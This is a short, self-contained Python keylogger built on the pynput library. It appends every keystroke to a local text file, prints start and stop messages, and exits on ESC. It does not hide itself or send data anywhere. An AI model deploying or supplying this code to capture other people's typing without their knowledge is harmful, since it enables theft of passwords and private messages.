from pynput import keyboard

# File to store logged keystrokes
LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            if hasattr(key, 'char') and key.char:
                log_file.write(key.char)
            elif key == keyboard.Key.space:
                log_file.write(" ")
            else:
                log_file.write(f"[{key}]")
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Start the keylogger
print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
